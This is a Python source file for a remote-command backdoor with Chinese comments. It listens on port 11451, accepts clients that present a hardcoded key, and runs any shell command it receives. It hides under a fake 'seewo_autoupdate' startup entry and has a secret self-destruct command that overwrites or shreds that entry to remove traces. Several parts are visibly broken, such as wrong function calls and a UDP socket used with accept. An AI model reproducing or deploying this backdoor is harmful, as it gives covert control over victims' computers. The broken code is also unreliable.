from base64 import b64encode,b64decode
import os
import socket
import subprocess
import sys
# import threading

if sys.platform == "win32":
    osCharset = "GB18030"
else:
    osCharset = "UTF-8"

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)         # 创建 socket 对象
s.connect(("192.168.0.0",80)) # 仅做获取IP之用，不会真的连接，网络内没有这个设备也可以，也许要求有局域网连接，不过要是连这个也没有，那还用个坤8
s.bind((s.getsockname()[0], 11451))        # 绑定端口

s.listen(5)                 # 等待客户端连接
c,addr = s.accept()

ClientAlive:bool = None
ClientVersion = None
ClientKey = None

def send(msg):
    global c
    return c.send(b64encode(msg.encode('UTF-8')))

def recv(buffer=1048576):
    global c
    return b64decode(c.recv(buffer)).decode("UTF-8")

def chkClient(client):
    global c,addr
    ci = recv()
    if ci.getVersion() == "25.5.5" and ci.getCurrentKey() == "jbpm4dl":
        send("allowedToConnect")
        return True
    else:
        send("notAllow")
        c.close()
        addr = None
        return False

def handleClientMsg(ClientMsg):
    global ClientAlive,ClientVersion,ClientKey
    pureClientMsg = ClientMsg[1:len(ClientMsg)].split()
    if pureClientMsg == []:
        return 0
    match pureClientMsg[0]:
        case "alive":
            ClientAlive = pureClientMsg[3]
        case "version":
            ClientVersion = pureClientMsg[3]
        case "usingkey":
            ClientKey = pureClientMsg[3]
        case _:
            pass

"""
def runInBg(func,argv=[]):
    bgFunc = threading.Thread(target=func)
    bgFunc.start()
"""

def testAlive():
    send("]testAlive")
    handleClientMsg(recv())

def askClientVersion():
    send("]askClientVersion")
    handleClientMsg(recv())

def askClientValidity():
    send("]askClientValidity")
    handleClientMsg(recv())

def waitForReconnect(testAliveRequired=True):
    global c,s,ClientAlive
    try:
        if testAliveRequired:
            testAlive()
        else:
            ClientAlive = False
        if ClientAlive != True:
            c.close()
            s.listen(5)
            c,addr = s.accept()
    except TimeoutError:
        c.close()
        s.listen(5)
        c,addr = s.accept()
    except ConnectionAbortedError:
        c.close()
        s.listen(5)
        c,addr = s.accept()

def readPipe(self):
    pipe = subprocess.Popen(self.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=False)
    stdout,stderr = pipe.communicate()
    return [stdout,stderr]

while chkClient() == False:
    send("无效")
    s.listen(5)
    c,addr = s.accept()

match sys.platform:
    case "win32":
        if os.path.isfile("%APPDATA%\remotesh\custom.cmd"):
            os.system("cmd /c start %APPDATA%\remotesh\custom.cmd")
        else:
            pass
    case "linux":
        if os.path.isfile("~/.config/remotesh/custom.sh"):
            os.system("$SHELL ~/.config/remotesh/custom.sh")
        else:
            pass
    case _:
        pass

while True:
    try:
        ClientMsg = recv()
    except ConnectionResetError:
        waitForReconnect(False) # 意外断开连接时不检测客户端存活
        continue
    try:
        if len(ClientMsg) > 0:
            pass
        else:
            waitForReconnect()
            continue
    except ConnectionAbortedError:
        waitForReconnect()
        continue
    if ClientMsg[0] == "_":
        match ClientMsg:
            case "__5oiR5ZG95Luk5L2g6114514YCf6YCf6YCA5Ye6_exit_asap_pls, tysm!!!":
                break
            case "__5LmJ44hirohitoGv5bGx5bKz44KI44KK44KC6YeN44GP44CB5q2744Gv6bi/5q+b44KI44KK44KC6L2744GX_glorious_death!!!": # 主要是win32上面没有方便的shred，而想出来的笨办法
                match sys.platform:
                    case "win32":
                        os.system("curl cn.bing.com > C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\seewo_autoupdate.exe")
                        os.remove("C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\seewo_autoupdate.exe")
                        os.system("curl baidu.com > C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\seewo_autoupdate.exe")
                        os.remove("C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\seewo_autoupdate.exe")
                        os.system("curl 4399.com > C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\seewo_autoupdate.exe")
                        os.remove("C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\seewo_autoupdate.exe")
                    case "linux":
                        os.system("shred -n 10 -z -u --random-source=/dev/random /etc/init.d/seewo_autoupdate")
                    case _:
                        send("nImpele")
    elif ClientMsg[0] == "]":
        # print(ClientMsg)
        handleClientMsg(ClientMsg)
    else:
        try:
            result = subprocess.check_output(ClientMsg,shell=True,stderr=subprocess.STDOUT).decode(osCharset)
        except subprocess.CalledProcessError:
            result = "这命令返回非0"
        except UnicodeDecodeError:
            result = "暂时不能执行这个命令"
        except:
            result = "其他错误"
        finally:
            send(result)

c.close()
s.close()